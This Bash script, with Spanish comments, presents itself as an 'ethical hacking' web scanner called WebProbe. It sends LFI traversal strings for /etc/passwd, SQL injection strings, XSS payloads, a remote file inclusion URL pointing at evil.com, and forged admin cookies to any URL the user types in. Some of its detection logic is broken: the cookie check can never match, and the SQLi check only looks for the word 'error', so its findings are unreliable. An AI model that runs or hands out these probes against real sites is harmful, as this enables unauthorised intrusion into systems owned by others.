#!/bin/bash

# Función para detectar la vulnerabilidad de LFI (Local File Inclusion)
detectar_lfi() {
    local url=$1
    local payloads=("../etc/passwd" "../../etc/passwd" "../../../etc/passwd")
    for payload in "${payloads[@]}"; do
        local test_url="$url$payload"
        local response=$(curl -s "$test_url")
        if [[ $response == *"root:"* ]]; then
            echo -e "\e[1;31m[!] Vulnerabilidad LFI detectada: $test_url"
        fi
    done
}

# Función para detectar la vulnerabilidad de SQLi (SQL Injection)
detectar_sqli() {
    local url=$1
    local payloads=("' OR '1'='1" "' OR '1'='2")
    for payload in "${payloads[@]}"; do
        local test_url="$url$payload"
        local response=$(curl -s "$test_url")
        if [[ $response == *"error"* ]]; then
            echo -e "\e[1;31m[!] Vulnerabilidad SQLi detectada: $test_url"
        fi
    done
}

# Función para detectar la vulnerabilidad de XSS (Cross-Site Scripting)
detectar_xss() {
    local url=$1
    local payloads=("<script>alert(\"XSS\")</script>" "<img src=\"x\" onerror=\"alert('XSS')\">")
    for payload in "${payloads[@]}"; do
        local test_url="$url$payload"
        local response=$(curl -s "$test_url")
        if [[ $response == *"$payload"* ]]; then
            echo -e "\e[1;31m[!] Vulnerabilidad XSS detectada: $test_url"
        fi
    done
}

# Función para detectar la vulnerabilidad de RFI (Remote File Inclusion)
detectar_rfi() {
    local url=$1
    local payloads=("http://www.evil.com/malicious_script")
    for payload in "${payloads[@]}"; do
        local test_url="$url$payload"
        local response=$(curl -s "$test_url")
        if [[ $response == *"evil_content"* ]]; then
            echo -e "\e[1;31m[!] Vulnerabilidad RFI detectada: $test_url"
        fi
    done
}

# Función para detectar la vulnerabilidad de manipulación de cookies (Cookie Manipulation)
detectar_cookie_manipulation() {
    local url=$1
    local cookies=("admin=true" "user=admin")
    local cookie_header=""
    for cookie in "${cookies[@]}"; do
        cookie_header+=" -H 'Cookie: $cookie'"
    done
    local response=$(curl -s $cookie_header "$url")
    if [[ $response == *"HTTP/1.1 200"* ]]; then
        echo -e "\e[1;31m[!] Vulnerabilidad de manipulación de cookies detectada: $url"
    fi
}

# Función principal del programa
main() {
    clear
    echo -e "\e[1;34m"
    echo " ____                _       _     _ "
    echo "| __ )   _   _    __| |   __| | __| |"
    echo "|  _ \  | | | |  / _  |  / _  |/ _  |"
    echo "| |_) | | |_| | | (_| | | (_| | (_| |"
    echo "|____/   \__,_|  \__,_|  \__,_|\__,_|"
    echo
    echo -e "\e[0m"

    echo -e "\e[1;36m[*] Iniciando WebProbe - Herramienta de Hacking Ético\e[0m"

    # Comprobar si las dependencias están instaladas
    echo -e "\e[1;36m[*] Comprobando dependencias...\e[0m"
    dependencies=("curl")
    missing_dependencies=()
    for dependency in "${dependencies[@]}"; do
        if ! command -v "$dependency" >/dev/null 2>&1; then
            missing_dependencies+=("$dependency")
        fi
    done

    if [ ${#missing_dependencies[@]} -gt 0 ]; then
        echo -e "\e[1;31m[!] Faltan las siguientes dependencias: ${missing_dependencies[*]}\e[0m"
        echo -e "\e[1;31m[!] Por favor, instala las dependencias faltantes antes de continuar.\e[0m"
        exit 1
    fi

    echo -e "\e[1;32m[✓] Todas las dependencias están instaladas.\e[0m"

    # Solicitar la URL al usuario
    read -p "Introduce el sitio web que deseas escanear: " url

    # Escaneo de vulnerabilidades
    detectar_lfi "$url"
    detectar_sqli "$url"
    detectar_xss "$url"
    detectar_rfi "$url"
    detectar_cookie_manipulation "$url"
}

main
